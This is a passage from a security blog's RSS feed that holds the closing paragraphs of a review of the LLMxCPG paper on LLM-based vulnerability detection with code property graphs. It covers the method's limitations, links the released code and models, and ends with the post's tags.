cleanly resolve the dependency on computing power when the query model (<code>LLMxCPG-Q</code>) preprocesses large codebases. Furthermore, it inherits the inherent limitations of CPGs, such as the difficulty in detecting vulnerabilities like race conditions or business logic errors, which are tied to runtime properties. Thus, its limitations are clear.</p><p>Nevertheless, the idea and implementation of generating and compressing a semantically equivalent execution path directly related to the vulnerability from the original code for analysis using CPGs was fascinating. While the reasoning capabilities and context size of LLMs are constantly improving, rather than just waiting for model performance to get better, advancing optimization research like this could accelerate faster and more accurate automated vulnerability detection.</p><p>I didn&#x2019;t cover the implementation details, but I might return with a Part 2 review after trying out the publicly available <a href="https://www.google.com/search?q=https://github.com/qcri/llmxcpg">source code</a> and <a href="https://huggingface.co/collections/QCRI/llmxcpg-6855f80e601774b43eba2d14">models</a>. Those who are interested might want to check them out first.</p><p>I&#x2019;ll be back with more interesting paper reviews in the future!</p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/review/">review</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/llm/">llm</category>
      
      <category domain="https://hackyboiz.github.io/tags/usenix/">usenix</category>
      
      <category domain="https://hackyboiz.github.io/tags/cpg/">cpg</category>
      
      <category domain="https://hackyboiz.github.io/tags/vulnerability-detection/">vulnerability detection</category>
      
      <category domain="https://hackyboiz.github.io/tags/paper/">paper</category>
      
      
      <comments>https://hackyboiz.github.io/2025/09/22/l0ch/llmxcpg_paper_review/en/#disqus_thread</comments>
      
    </item>
    
  </channel>
</rss>
